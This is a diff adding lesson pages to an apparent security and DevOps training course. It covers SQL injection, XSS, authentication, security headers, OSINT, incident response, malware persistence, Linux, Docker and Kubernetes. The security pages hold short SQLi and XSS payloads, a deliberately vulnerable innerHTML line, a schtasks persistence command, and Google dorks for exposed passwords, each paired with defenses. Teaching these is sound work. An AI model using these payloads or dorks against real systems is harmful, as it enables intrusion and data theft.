+- Air gaps are not enough (USB drives bypass them)
+- Industrial control systems (ICS/SCADA) need security updates
+- Supply chain attacks are real — inspect everything entering secure facilities
+- Monitor for unusual behavior, not just known malware signatures`
+      }
+    ]
+  },
+
+  110: {
+    titleEn: "SQL Injection & XSS Deep Dive",
+    pages: [
+      {
+        titleEn: "SQL Injection Techniques",
+        contentEn: `**Beyond basic SQLi — advanced techniques attackers use:**
+
+**1. UNION-based SQLi**
+- Combines results from two queries:
+\`\`\`sql
+' UNION SELECT username, password FROM users --
+\`\`\`
+- Attacker must match the number of columns in the original query
+- Used to extract data from other tables
+
+**2. Blind SQLi (Boolean-based)**
+- The page doesn't show query results, but behaves differently for true/false
+\`\`\`sql
+' AND 1=1 --   (page loads normally → true)
+' AND 1=2 --   (page shows error → false)
+\`\`\`
+- Attacker asks yes/no questions to extract data one bit at a time
+- Example: "Is the first character of the admin password 'a'?"
+
+**3. Time-based Blind SQLi**
+- No visible difference in response. Attacker uses delays:
+\`\`\`sql
+' AND IF(1=1, SLEEP(5), 0) --
+\`\`\`
+- If response takes 5 seconds → condition is true
+- Very slow but works when nothing else does
+
+**Defenses (recap):**
+- Parameterized queries / prepared statements — always #1
+- ORM (Object-Relational Mapping) — abstracts SQL away
+- Input validation + WAF as extra layers
+- Regular security testing (SQLMap, Burp Scanner)`
+      },
+      {
+        titleEn: "XSS Deep Dive",
+        contentEn: `**Three types of XSS in detail:**
+
+**1. Stored XSS (Persistent)**
+- Malicious script is saved in the database
+- Every user who views the page executes the script
+- Most dangerous — affects many users automatically
+- Example: attacker posts a comment containing \`<script>...\</script>\`
+
+**2. Reflected XSS (Non-persistent)**
+- Script is part of the URL/request
+- Server includes the input in the response without sanitizing
+- Attacker must trick the victim into clicking a crafted link
+- Example: \`search.php?q=<script>alert(1)</script>\`
+
+**3. DOM-based XSS**
+- The vulnerability is in **client-side JavaScript**, not the server
+- The server never sees the malicious input
+- Example: JavaScript reads from \`location.hash\` and writes to \`innerHTML\`
+\`\`\`javascript
+// Vulnerable code
+document.getElementById('output').innerHTML = location.hash.slice(1);
+// Attack URL: page.html#<img src=x onerror=alert(1)>
+\`\`\`
+
+**XSS impact:**
+- Steal session cookies → account takeover
+- Redirect users to phishing pages
+- Capture keystrokes (keylogger)
+- Deface the website
+
+**Defenses:**
+- Output encoding (HTML entities, JavaScript encoding)
+- Content Security Policy (CSP) header
+- Use frameworks that auto-escape (React, Angular)
+- \`HttpOnly\` flag on cookies (prevents JavaScript access)`
+      }
+    ]
+  },
+
+  111: {
+    titleEn: "Authentication & Authorization",
+    pages: [
+      {
+        titleEn: "Authentication vs Authorization",
+        contentEn: `**Authentication (AuthN)** = verifying **who you are**
+**Authorization (AuthZ)** = verifying **what you can do**
+
+**Example:**
+- You show your ID at the door → Authentication
+- The guard checks if you can enter the VIP room → Authorization
+
+**Authentication factors:**
+- **Something you know** — password, PIN
+- **Something you have** — phone (OTP), security key (YubiKey)
+- **Something you are** — fingerprint, face scan
+
+**MFA (Multi-Factor Authentication):**
+- Uses 2+ factors from different categories
+- Password + SMS code = MFA (know + have)
+- Password + security question = NOT MFA (both are "know")
+
+**Common authentication methods:**
+- **Session-based** — server stores session, sends cookie to browser
+- **Token-based (JWT)** — server sends signed token, client includes it in every request
+- **OAuth 2.0** — "Login with Google/GitHub" — delegated authorization
+- **SSO** — one login for multiple apps (Azure AD, Okta)
+
+**Common mistakes:**
+- Storing passwords in plain text (use hashing!)
+- No account lockout after failed attempts
+- Session tokens that never expire
+- No MFA on admin accounts`
+      },
+      {
+        titleEn: "Password Hashing",
+        contentEn: `**Never store passwords in plain text.** Use hashing.
+
+**Hashing** = one-way function that turns a password into a fixed-length string.
+\`\`\`
+"mypassword" → hash() → "5f4dcc3b5aa765d61d8327deb882cf99"
+\`\`\`
+You cannot reverse a hash back to the original password.
+
+**Why plain hashing is not enough:**
+- **Rainbow tables** — precomputed hashes for millions of common passwords
+- If two users have the same password → same hash → attacker knows
+
+**Salt** = random value added to each password before hashing:
+\`\`\`
+"mypassword" + "x7Kp9" → hash() → "a1b2c3..."  (user 1)
+"mypassword" + "Qm3rZ" → hash() → "d4e5f6..."  (user 2)
+\`\`\`
+Same password, different salt → different hash. Rainbow tables become useless.
+
+**Recommended algorithms:**
+- **bcrypt** — most widely used, has built-in salt, adjustable cost factor
+- **Argon2** — newest, winner of Password Hashing Competition (2015), memory-hard (resists GPU attacks)
+- **scrypt** — memory-hard alternative to bcrypt
+
+**Do NOT use:** MD5, SHA-1, SHA-256 for passwords (too fast → easy to brute force)`
+      }
+    ]
+  },
+
+  112: {
+    titleEn: "HTTP Security Headers & CSRF Defense",
+    pages: [
+      {
+        titleEn: "HTTP Security Headers",
+        contentEn: `**Security headers** are HTTP response headers that tell the browser how to behave securely.
+
+**Content-Security-Policy (CSP):**
+- Controls which resources (scripts, styles, images) can load
+- Prevents XSS by blocking inline scripts
+\`\`\`
+Content-Security-Policy: default-src 'self'; script-src 'self' cdn.example.com
+\`\`\`
+- Only scripts from your domain and cdn.example.com will run
+
+**Strict-Transport-Security (HSTS):**
+- Forces HTTPS — browser will never use HTTP for this domain
+\`\`\`
+Strict-Transport-Security: max-age=31536000; includeSubDomains; preload
+\`\`\`
+- Prevents SSL stripping attacks (MITM downgrades HTTPS to HTTP)
+
+**X-Frame-Options:**
+- Prevents your page from being loaded in an iframe
+\`\`\`
+X-Frame-Options: DENY
+\`\`\`
+- Defends against **clickjacking** (invisible iframe over a real page)
+
+**Other important headers:**
+- **X-Content-Type-Options: nosniff** — prevents MIME type sniffing
+- **Referrer-Policy: strict-origin** — controls what URL info is sent to other sites
+- **Permissions-Policy** — disables browser features (camera, microphone, geolocation)
+
+**Check your headers:** Use securityheaders.com to scan your site (grade A-F)`
+      },
+      {
+        titleEn: "CSRF Tokens & SameSite Cookies",
+        contentEn: `**CSRF (Cross-Site Request Forgery)** — the browser sends your cookies automatically, even from a malicious site.
+
+**Defense 1: CSRF Tokens**
+- Server generates a random token for each session/form
+- Token is included in every form as a hidden field
+\`\`\`html
+<form action="/transfer" method="POST">
+  <input type="hidden" name="csrf_token" value="a1b2c3d4e5">
+  <input name="amount" value="100">
+  <button>Transfer</button>
+</form>
+\`\`\`
+- Server checks: does the token match? If not → reject
+- Attacker cannot guess the token → attack fails
+
+**Defense 2: SameSite Cookies**
+- Cookie attribute that controls when cookies are sent cross-site
+\`\`\`
+Set-Cookie: session=abc123; SameSite=Strict
+\`\`\`
+
+**SameSite values:**
+- **Strict** — cookie is never sent cross-site (safest, but breaks some links)
+- **Lax** — cookie sent on top-level navigation (GET only), not on POST/forms from other sites. **Default in modern browsers.**
+- **None** — cookie always sent (must use Secure flag with HTTPS)
+
+**Defense 3: Check Origin/Referer headers**
+- Server checks where the request came from
+- If origin doesn't match your domain → reject
+
+**Best practice:** Use CSRF tokens + SameSite=Lax + check Origin header. Defense in depth.`
+      }
+    ]
+  },
+
+  113: {
+    titleEn: "Threat Intelligence & OSINT",
+    pages: [
+      {
+        titleEn: "Threat Intelligence Levels",
+        contentEn: `**Threat Intelligence** = information about threats that helps you make security decisions.
+
+**Three levels:**
+
+**1. Tactical (Technical)**
+- IOCs (Indicators of Compromise): malicious IPs, domains, file hashes
+- Used by: SOC analysts, SIEM rules, firewall blocks
+- Lifespan: hours to days (attackers change infrastructure often)
+- Example: "Block IP 203.0.113.42 — it's a C2 server for Cobalt Strike"
+
+**2. Operational**
+- TTPs (Tactics, Techniques, and Procedures) — how attackers operate
+- Used by: incident responders, threat hunters
+- Lifespan: months (attackers reuse methods)
+- Frameworks: **MITRE ATT&CK** — maps all known attacker techniques
+- Example: "APT29 uses spear phishing with OAuth tokens to access cloud email"
+
+**3. Strategic**
+- High-level trends, geopolitical context, risk assessment
+- Used by: CISO, board of directors, executives
+- Lifespan: months to years
+- Example: "Ransomware attacks on healthcare increased 94% this year. Budget for backup infrastructure."
+
+**Threat Intelligence sources:**
+- **Open source (OSINT)** — free: VirusTotal, AlienVault OTX, MITRE ATT&CK
+- **Commercial** — paid feeds: Recorded Future, Mandiant, CrowdStrike
+- **Government** — CISA alerts, FBI flash reports
+- **ISACs** — industry-specific sharing (Financial ISAC, Health ISAC)`
+      },
+      {
+        titleEn: "OSINT Tools & Techniques",
+        contentEn: `**OSINT** (Open Source Intelligence) = gathering information from publicly available sources.
+
+**Key tools:**
+
+**Shodan** — "Search engine for the Internet of Things"
+- Finds internet-connected devices: webcams, servers, routers, SCADA
+- Search: \`port:3389 country:US\` → find open Remote Desktop servers in the US
+- Useful for: finding exposed services your organization didn't know about
+
+**Censys** — similar to Shodan, focused on certificates and web services
+- Search by SSL certificate details, HTTP response headers
+- Find all servers using a specific certificate or technology
+
+**WHOIS / DNS tools**
+- \`whois example.com\` — who registered the domain? When? Contact info?
+- \`dig example.com\` — DNS records (A, MX, NS, TXT)
+- **SecurityTrails** — historical DNS data (what did this domain point to last year?)
+
+**Google Dorking** — advanced Google searches to find sensitive info:
+- \`site:example.com filetype:pdf\` — find PDFs on a domain
+- \`intitle:"index of" password\` — find exposed directories
+- \`inurl:admin login\` — find admin login pages
+
+**Other OSINT tools:**
+- **theHarvester** — collect emails, subdomains, IPs from public sources
+- **Maltego** — visual link analysis (connects people, domains, IPs)
+- **Recon-ng** — modular recon framework (like Metasploit for OSINT)
+- **Have I Been Pwned** — check if your email/password was leaked
+
+**Ethics:** OSINT is legal (public data) but use it responsibly. Don't access systems you find — just report.`
+      }
+    ]
+  },
+
+  114: {
+    titleEn: "Incident Response",
+    pages: [
+      {
+        titleEn: "The 6 Phases of Incident Response (NIST)",
+        contentEn: `When a security incident happens, you need a structured response. NIST defines 6 phases:
+
+**1. Preparation**
+- Build an IR team with clear roles
+- Write playbooks for common incidents (ransomware, data breach, DDoS)
+- Set up tools: SIEM, forensic workstations, communication channels
+- Run tabletop exercises (simulate incidents)
+
+**2. Identification**
+- Detect and confirm the incident
+- Sources: SIEM alerts, user reports, threat intelligence, anomaly detection
+- Key questions: What happened? When? What systems are affected? Is it ongoing?
+- Document everything with timestamps
+
+**3. Containment**
+- **Short-term:** isolate affected systems (disconnect from network, disable accounts)
+- **Long-term:** apply temporary fixes while preparing for eradication
+- Preserve evidence (disk images, memory dumps, logs) before making changes
+
+**4. Eradication**
+- Remove the threat completely (malware, backdoors, compromised accounts)
+- Patch the vulnerability that was exploited
+- Reset all potentially compromised credentials
+
+**5. Recovery**
+- Restore systems from clean backups
+- Rebuild compromised systems from scratch (don't trust cleaned systems)
+- Monitor closely for signs of re-infection
+- Gradually bring systems back online
+
+**6. Lessons Learned**
+- Hold a post-incident review within 1-2 weeks
+- What went well? What went wrong? What do we improve?
+- Update playbooks, detection rules, and security controls
+- Share findings with the team (and industry if appropriate)`
+      },
+      {
+        titleEn: "Story: SolarWinds Supply Chain Attack (2020)",
+        contentEn: `In December 2020, the cybersecurity firm FireEye discovered one of the most sophisticated attacks in history.
+
+**What happened:**
+- Hackers compromised **SolarWinds Orion** — a network monitoring tool used by 33,000+ organizations
+- They inserted a backdoor (called **SUNBURST**) into a legitimate software update
+- The infected update was signed with SolarWinds' real certificate
+- 18,000 organizations installed the update — including the US government
+
+**Who was affected:**
+- US Treasury, Commerce, Homeland Security departments
+- Microsoft, Intel, Cisco, Deloitte
+- FireEye (who discovered the attack while investigating their own breach)
+
+**How it worked:**
+1. Attackers accessed SolarWinds' build system (where software is compiled)
+2. Added malicious code to the Orion update (version 2019.4 - 2020.2.1)
+3. The backdoor waited 2 weeks after install before activating (to avoid detection)
+4. It communicated with C2 servers using DNS requests that looked like normal Orion traffic
+5. Attackers selected high-value targets and moved deeper into their networks
+
+**Attribution:** Russian intelligence (SVR) — group known as APT29 / Cozy Bear
+
+**Impact:**
+- Estimated cost: $100 billion+
+- Led to a US Executive Order on improving national cybersecurity
+- Changed how organizations think about supply chain security
+
+**Lessons:**
+- Trust no software blindly — even from trusted vendors
+- Monitor outbound DNS and network traffic for anomalies
+- Verify software integrity (build reproducibility, code signing reviews)
+- Assume breach — have detection for post-compromise activity`
+      }
+    ]
+  },
+
+  115: {
+    titleEn: "Malware & Persistence",
+    pages: [
+      {
+        titleEn: "Malware Types",
+        contentEn: `**Malware** = malicious software designed to harm, exploit, or steal.
+
+**Types of malware:**
+
+**Virus**
+- Attaches to legitimate files/programs
+- Spreads when the infected file is opened or shared
+- Needs human action to spread (opening a file, running a program)
+
+**Worm**
+- Spreads by itself across networks — no human action needed
+- Exploits vulnerabilities to move from system to system
+- Example: WannaCry (2017) — used EternalBlue to spread via SMB, infected 230,000+ computers in 150 countries
+
+**Trojan**
+- Looks like legitimate software but contains malicious code
+- User installs it willingly (fake antivirus, pirated game)
+- Does not self-replicate — relies on deception
+
+**Ransomware**
+- Encrypts your files and demands payment (usually Bitcoin) for the decryption key
+- Modern variants also steal data first (double extortion)
+- Example: REvil demanded $70 million from Kaseya victims (2021)
+
+**Rootkit**
+- Hides deep in the operating system (kernel level)
+- Makes itself and other malware invisible to antivirus
+- Very difficult to detect and remove — often requires OS reinstall
+- Can survive reboots and some can survive OS reinstall (firmware rootkits)
+
+**Other types:**
+- **Spyware** — monitors user activity (keylogger, screen capture)
+- **Adware** — displays unwanted ads, tracks browsing
+- **Botnet** — network of infected computers controlled by attacker (used for DDoS)`
+      },
+      {
+        titleEn: "Persistence Mechanisms",
+        contentEn: `**Persistence** = how malware survives a reboot and stays on the system.
+
+Attackers need persistence to maintain access. Here are common techniques:
+
+**1. Registry Run Keys (Windows)**
+- Add entries to auto-start on boot:
+\`\`\`
+HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run
+\`\`\`
+- Easy to detect but still widely used
+
+**2. Scheduled Tasks / Cron Jobs**
+- Windows: \`schtasks /create /tn "Update" /tr malware.exe /sc onlogon\`
+- Linux: add to \`/etc/crontab\` or user crontab
+- Can run at specific times or on specific events
+
+**3. Windows Services**
+- Register malware as a Windows service → starts automatically
+- Services run with SYSTEM privileges (highest level)
+- Can be set to restart on failure
+
+**4. Startup Folders**
+- Drop a shortcut or script in:
+\`\`\`
+C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup
+\`\`\`
+
+**5. DLL Hijacking / Side-Loading**
+- Place a malicious DLL in a folder where a legitimate program searches first
+- The program loads the malicious DLL instead of the real one
+
+**6. WMI Event Subscriptions (Windows)**
+- Advanced: trigger malware on specific system events
+- Hard to detect — not visible in common startup locations
+
+**Detection:**
+- Use **Autoruns** (Sysinternals) — shows all auto-start locations
+- Check scheduled tasks and services regularly
+- Monitor registry changes with SIEM
+- Use EDR (Endpoint Detection and Response) tools for real-time monitoring`
+      }
+    ]
+  },
+
+  // ========== DEVOPS TRACK (201-209) ==========
+201: {
+    titleEn: "Linux Fundamentals",
+    pages: [
+      {
+        titleEn: "The Filesystem Hierarchy (FHS)",
+        contentEn: `Linux organizes everything in a single tree that starts at /.
+
+**Key directories:**
+- **/bin** — essential commands (ls, cp, cat)
+- **/etc** — configuration files (like the "settings folder")
+- **/home** — each user gets a folder here (/home/alice)
+- **/var** — variable data: logs, databases, mail
+- **/tmp** — temporary files (cleared on reboot)
+- **/usr** — user programs and libraries
+- **/dev** — device files (disks, terminals)
+- **/proc** — virtual filesystem showing running processes
+
+**The big idea:** In Linux, everything is a file.
+A hard disk? A file (/dev/sda).
+A running process? A folder (/proc/1234).
+A network socket? Also a file.
+
+This is very different from Windows, where drives have letters (C:\\, D:\\) and settings live in the Registry.`
+      },
+      {
+        titleEn: "Essential Linux Commands",
+        contentEn: `Every DevOps engineer uses these commands daily.
+
+**System monitoring:**
+- **top** / **htop** — see CPU and memory usage live
+- **df -h** — show disk space ("disk free, human-readable")
+- **free -h** — show RAM usage
+
+**Network:**
+- **ss -tulnp** — show open ports and which process uses them
+- **curl** — make HTTP requests from the terminal
+
+**Logs and debugging:**
+- **journalctl -u nginx** — read logs for a specific service
+- **journalctl -f** — follow logs in real time (like a live stream)
+- **lsof -i :8080** — find which process uses port 8080
+
+**File operations:**
+- **grep -r "error" /var/log/** — search for "error" in all log files
+- **tail -f /var/log/syslog** — watch a log file live
+- **find / -name "*.conf"** — find all config files
+
+> A good DevOps engineer does not guess. They check logs first.`
+      },
+      {
+        titleEn: "Permissions: chmod and chown",
+        contentEn: `Linux controls who can read, write, or run each file.
+
+**Three permission groups:**
+- **Owner** — the user who created the file
+- **Group** — a team of users
+- **Others** — everyone else
+
+**Three permission types:**
+- **r** (read = 4) — can open and read
+- **w** (write = 2) — can change or delete
+- **x** (execute = 1) — can run as a program
+
+**Reading permissions:**
+\`-rwxr-xr--\` means:
+- Owner: rwx (read + write + execute = 7)
+- Group: r-x (read + execute = 5)
+- Others: r-- (read only = 4)
+
+**Commands:**
+- \`chmod 755 script.sh\` — owner can do all, others can read and run
+- \`chmod 600 secret.key\` — only owner can read and write
+- \`chown alice:devteam file.txt\` — change owner to alice, group to devteam
+
+{question}
+A file has permissions \`-rw-r-----\`. Who can read it?
+a) Everyone on the system
+b) Only the owner and the group
+c) Only the owner
+d) Nobody
+
+answer: b
+explanation: Owner has rw- (read+write), Group has r-- (read only), Others have --- (no access).`
+      },
+      {
+        titleEn: "systemd: Managing Services",
+        contentEn: `systemd is the boss of all processes on modern Linux.
+
+**What is a service?**
+A program that runs in the background. Examples: a web server (nginx), a database (postgres), your own app.
+
+**Essential commands:**
+- \`systemctl start nginx\` — start the service
+- \`systemctl stop nginx\` — stop the service
+- \`systemctl restart nginx\` — stop then start
+- \`systemctl status nginx\` — is it running? any errors?
+- \`systemctl enable nginx\` — start automatically on boot
+- \`systemctl disable nginx\` — do not start on boot
+
+**Creating your own service:**
+\`\`\`ini
+# /etc/systemd/system/myapp.service
+[Unit]
+Description=My Application
+After=network.target
+
+[Service]
+ExecStart=/usr/bin/python3 /opt/myapp/server.py
+Restart=always
+User=appuser
+
+[Install]
+WantedBy=multi-user.target
+\`\`\`
+
+**Key idea:** \`Restart=always\` means if your app crashes, systemd will restart it automatically. This is self-healing at the OS level.
+
+{simulation}
+Your web app is not responding. Walk through the debugging steps:
+1. \`systemctl status myapp\` — is the service running?
+2. \`journalctl -u myapp -n 50\` — what do the last 50 log lines say?
+3. \`ss -tulnp | grep 8080\` — is something blocking the port?
+4. \`df -h\` — is the disk full?
+5. \`free -h\` — is the system out of memory?`
+      }
+    ]
+  },
+
+  202: {
+    titleEn: "Containers & Docker",
+    pages: [
+      {
+        titleEn: "VMs vs Containers",
+        contentEn: `Both VMs and containers isolate applications, but in very different ways.
+
+**Virtual Machine (VM):**
+- Runs a full operating system inside your OS
+- Has its own kernel, drivers, and libraries
+- Heavyweight: takes minutes to start, uses GBs of RAM
+- Example: VirtualBox, VMware, EC2 instances
+
+**Container:**
+- Shares the host OS kernel
+- Only packs the app + its dependencies
+- Lightweight: starts in seconds, uses MBs of RAM
+- Example: Docker containers
+
+**Analogy:**
+- A VM is like renting an entire apartment (your own kitchen, bathroom, walls)
+- A container is like a co-working desk (shared building, your own space)
+
+**Why containers won:**
+- 10x faster startup
+- 10x less disk and memory usage
+- Easy to move between machines (works on my laptop = works on the server)
+- Perfect for microservices (one container per service)
+
+| Feature | VM | Container |
+|---|---|---|
+| Startup time | Minutes | Seconds |
+| Size | GBs | MBs |
+| Isolation | Full OS | Process-level |
+| Performance | Some overhead | Near-native |`
+      },
+      {
+        titleEn: "Dockerfile: Building Images",
+        contentEn: `A Dockerfile is a recipe that tells Docker how to build an image.
+
+**Key instructions:**
+- **FROM** — the base image to start from
+- **RUN** — execute a command during build
+- **COPY** — copy files from your machine into the image
+- **CMD** — the default command when the container starts
+- **EXPOSE** — document which port the app uses
+- **ENV** — set environment variables
+
+**Example:**
+\`\`\`dockerfile
+FROM node:20-alpine
+WORKDIR /app
+COPY package*.json ./
+RUN npm install
+COPY . .
+EXPOSE 3000
+CMD ["node", "server.js"]
+\`\`\`
+
+**How layers work:**
+Each instruction creates a layer. Docker caches layers.
+If you change your code but not package.json, Docker skips the \`npm install\` layer. This makes builds fast.
+
+**Layer order matters:**
+- Put things that change rarely at the top (FROM, package.json)
+- Put things that change often at the bottom (COPY source code)
+
+**Build and run:**
+\`\`\`bash
+docker build -t myapp:1.0 .
+docker run -p 3000:3000 myapp:1.0
+\`\`\`
+
+{question}
+Why do we COPY package.json before COPY . (the full source)?
+a) It does not matter, the order is random
+b) So Docker can cache the npm install layer when only code changes
+c) Because package.json must be copied first by law
+d) To make the image smaller
+
+answer: b
+explanation: Docker caches each layer. If package.json did not change, the RUN npm install layer is reused. This saves minutes on every build.`
+      },
+      {
+        titleEn: "Docker Compose: Multi-Container Apps",
+        contentEn: `Most real apps need more than one container. Docker Compose manages them all.
+
+**Example: web app + database + cache**
+\`\`\`yaml
+# docker-compose.yml
+version: "3.8"
+services:
+  web:
+    build: .
+    ports:
+      - "3000:3000"
+    environment:
+      - DB_HOST=db
+      - REDIS_HOST=cache
+    depends_on:
+      - db
+      - cache
+
+  db:
+    image: postgres:15
+    environment:
+      POSTGRES_PASSWORD: secret
+    volumes:
+      - pgdata:/var/lib/postgresql/data
+
+  cache:
+    image: redis:7-alpine
+
+volumes:
+  pgdata:
+\`\`\`
+
+**Key concepts:**
+- **services** — each service is one container
+- **depends_on** — start db and cache before web
+- **volumes** — pgdata keeps database files safe even if the container is deleted
+- **environment** — pass config without hardcoding
+
+**Commands:**
+- \`docker compose up -d\` — start all services in background
+- \`docker compose down\` — stop and remove all containers
+- \`docker compose logs -f web\` — follow logs of the web service
+- \`docker compose ps\` — list running services
+
+**Why Compose matters:** One command to start your entire application stack. New developer? Clone the repo, run \`docker compose up\`, done.`
+      },
+      {
+        titleEn: "Docker Networking",
+        contentEn: `Containers need to talk to each other and to the outside world. Docker provides three network types.
+
+**Bridge (default):**
+- Containers on the same bridge network can reach each other by name
+- Isolated from the host and from other networks
+- Best for: single-machine apps, development
+
+**Host:**
+- Container shares the host's network directly
+- No port mapping needed (the container IS the host, network-wise)
+- Best for: maximum performance, monitoring tools
+
+**Overlay:**
+- Connects containers across multiple machines
+- Used in Docker Swarm and Kubernetes
+- Best for: production clusters
+
+**How containers find each other:**
+\`\`\`yaml
+# In docker-compose.yml, services talk by name:
+web:
+  environment:
+    - DB_HOST=db    # "db" resolves to the db container's IP
+\`\`\`
+
+Docker runs its own internal DNS. When the web container asks for "db", Docker returns the IP of the database container.
+
+{thinkOutside}
+You have three microservices: API, Worker, and Database.
+- The API must be reachable from the internet (port 8080)
+- The Worker processes background jobs and talks to the Database
+- The Database must NOT be reachable from the internet
+
+How would you design the Docker networks?
+
+Hint: You can create multiple networks. A container can join more than one network.
+
+Possible solution:
+- Network "frontend": API container (exposed port 8080)
+- Network "backend": API + Worker + Database
+- The API is on both networks. The Database is only on "backend", so the internet cannot reach it directly.`
+      }
+    ]
+  },
+
+  203: {
+    titleEn: "Kubernetes (K8s) Basics",
+    pages: [
+      {
+        titleEn: "Core K8s Objects",
+        contentEn: `Kubernetes manages containers at scale. It uses objects to describe what you want.
+
+**Pod:**
+- The smallest unit in K8s
+- Contains one or more containers that share storage and network
+- Usually: one main container per Pod
+- Pods are temporary — they can be killed and recreated
+
+**Deployment:**
+- Manages a set of identical Pods
+- You say "I want 3 copies", K8s keeps 3 running at all times
+- Handles rolling updates: replace old version with new, one by one
+
+**Service:**
+- A stable network address for a group of Pods
+- Pods change IPs when they restart. A Service gives them a fixed name.
+- Types: ClusterIP (internal), NodePort (external port), LoadBalancer (cloud LB)
+
+**ConfigMap:**
+- Stores configuration as key-value pairs
+- Keeps config outside your container image
+- Example: database URL, feature flags
+
+**Secret:**
+- Like ConfigMap but for sensitive data
+- Base64 encoded (not encrypted by default!)
+- Example: passwords, API keys, TLS certificates
+
+**Mental model:** A Deployment creates Pods. A Service gives them a stable address. ConfigMaps and Secrets feed them configuration.`
+      },
+      {
+        titleEn: "YAML & kubectl",
+        contentEn: `You describe your desired state in YAML files. K8s makes it happen.
+
+**Example Deployment:**
+\`\`\`yaml
+apiVersion: apps/v1
+kind: Deployment
+metadata:
+  name: web-app
+spec:
+  replicas: 3
+  selector:
+    matchLabels:
+      app: web
+  template:
+    metadata:
+      labels:
+        app: web
+    spec:
+      containers:
+        - name: web
+          image: myapp:2.0
+          ports:
+            - containerPort: 3000
+          resources:
+            requests:
+              memory: "128Mi"
+              cpu: "250m"
+            limits:
+              memory: "256Mi"
+              cpu: "500m"
+\`\`\`
+
+**Essential kubectl commands:**
+- \`kubectl apply -f deploy.yaml\` — create or update resources
+- \`kubectl get pods\` — list all pods
+- \`kubectl describe pod web-app-xyz\` — detailed info about a pod
+- \`kubectl logs web-app-xyz\` — read pod logs
+- \`kubectl exec -it web-app-xyz -- /bin/sh\` — open a shell inside a pod
+- \`kubectl delete -f deploy.yaml\` — remove resources
+
+**Declarative vs Imperative:**
+- Imperative: "Create 3 pods now" (like giving step-by-step orders)
+- Declarative: "I want 3 pods" (K8s figures out how to get there)
+- K8s is declarative. You describe the end state, not the steps.
+
+{question}
+A Deployment has replicas: 3 and one pod crashes. What happens?
+a) The app goes down until you manually fix it
+b) K8s automatically creates a new pod to replace it
+c) K8s shuts down the other 2 pods
+d) Nothing, you need to run kubectl restart
+
+answer: b
+explanation: The Deployment controller always works to match the desired state (3 replicas). If a pod dies, it creates a new one.`
+      },
+      {
+        titleEn: "Horizontal Pod Autoscaler (HPA)",
+        contentEn: `HPA automatically adjusts the number of pods based on load.
+
+**How it works:**
+1. You define: "keep CPU usage around 50%"
+2. HPA checks metrics every 15 seconds
+3. If average CPU > 50% → add more pods
+4. If average CPU < 50% → remove extra pods
+
+**Example:**
+\`\`\`yaml
+apiVersion: autoscaling/v2
+kind: HorizontalPodAutoscaler
+metadata:
+  name: web-hpa
+spec:
+  scaleTargetRef:
+    apiVersion: apps/v1
+    kind: Deployment
+    name: web-app
+  minReplicas: 2
+  maxReplicas: 10
+  metrics:
+    - type: Resource
+      resource:
+        name: cpu
+        target:
+          type: Utilization
+          averageUtilization: 50
+\`\`\`
+
+**Key settings:**
+- **minReplicas: 2** — never go below 2 (high availability)
+- **maxReplicas: 10** — never go above 10 (cost control)
+- **averageUtilization: 50** — target 50% CPU usage
+
+**Scale-up vs scale-down:**
+- Scale-up is fast (seconds) — respond to traffic spikes quickly
+- Scale-down is slow (5 minutes default) — avoid flapping
+
+**Real example:**
+Normal load → 2 pods at 30% CPU.
+Black Friday sale → CPU jumps to 80%.
+HPA scales to 5 pods → CPU drops to 32%.
+Sale ends → HPA slowly scales back to 2 pods.
+
+This is why cloud-native apps can handle traffic spikes without human intervention.`
+      },
+      {
+        titleEn: "K8s Networking",
+        contentEn: `Kubernetes networking has three layers: pod-to-pod, services, and external access.
+
+**CNI (Container Network Interface):**
+- A plugin that gives each pod its own IP address
+- Popular choices: Calico, Flannel, Cilium
+- Rule: every pod can talk to every other pod (by default)
+
+**CoreDNS:**
+- The internal DNS server of K8s
+- Lets pods find services by name
+- \`my-service.my-namespace.svc.cluster.local\` → the service IP
+- Short form works too: just \`my-service\` within the same namespace
+
+**Service types:**
+- **ClusterIP** — internal only (default). Other pods can reach it.
+- **NodePort** — opens a port (30000-32767) on every node
+- **LoadBalancer** — creates a cloud load balancer (AWS ALB, GCP LB)
+
+**Ingress:**
+- Routes external HTTP traffic to internal services
+- Acts like a smart reverse proxy
+- Can route by path: /api → api-service, /web → web-service
+- Can route by domain: api.myapp.com → api-service
+- Handles TLS/SSL termination
+
+\`\`\`yaml
+apiVersion: networking.k8s.io/v1
+kind: Ingress
+metadata:
+  name: my-ingress
+spec:
+  rules:
+    - host: myapp.com
+      http:
+        paths:
+          - path: /api
+            pathType: Prefix
+            backend:
+              service:
+                name: api-service
+                port:
+                  number: 8080
+\`\`\`
+
+{simulation}
+Trace a user request through K8s networking:
+1. User types myapp.com/api/users in browser
+2. DNS resolves myapp.com to the cloud load balancer IP
+3. Load balancer sends traffic to a K8s node
+4. Ingress controller sees /api and routes to api-service
+5. api-service (ClusterIP) picks one of 3 healthy pods
+6. The pod processes the request and returns a response
+7. The response travels back the same path`
+      }
+    ]
+  },
+
+  204: {
+    titleEn: "Cloud Computing",
+    pages: [
+      {
+        titleEn: "Service Models: IaaS, PaaS, SaaS",
+        contentEn: `Cloud computing means renting computers over the internet instead of buying them.
+
+**Three service models:**
+
+**IaaS (Infrastructure as a Service):**
+- You rent raw servers, storage, and networks
+- You manage: OS, runtime, app, data
+- The cloud manages: physical hardware, power, cooling
+- Example: AWS EC2, Google Compute Engine, Azure VMs
+- Analogy: renting an empty apartment — you bring your own furniture
+
+**PaaS (Platform as a Service):**
+- You just deploy your code
+- The cloud manages: OS, runtime, scaling, updates
+- You manage: your app and its data
+- Example: Heroku, AWS Elastic Beanstalk, Google App Engine
+- Analogy: a hotel room — furniture included, just bring your clothes
+
+**SaaS (Software as a Service):**
+- You use a finished product
+- The cloud manages everything
+- Example: Gmail, Slack, Salesforce
+- Analogy: going to a restaurant — just eat, no cooking
+
+| You manage | IaaS | PaaS | SaaS |
+|---|---|---|---|
+| Application | Yes | Yes | No |
+| Runtime | Yes | No | No |
+| OS | Yes | No | No |
+| Hardware | No | No | No |
+
+**How to choose:**
+- Need full control? → IaaS
+- Want to focus on code? → PaaS
+- Just need to use software? → SaaS`
+      },
+      {
+        titleEn: "AWS Core Services",
+        contentEn: `AWS is the largest cloud provider. These are the services you must know.
+
+**Compute:**
+- **EC2** — virtual servers (IaaS). Choose CPU, RAM, disk. You manage the OS.
+- **Lambda** — serverless functions. Upload code, pay per execution. No servers to manage.
+
+**Storage:**
+- **S3** — object storage. Store files, images, backups. Very cheap, very durable (99.999999999% — "eleven nines").
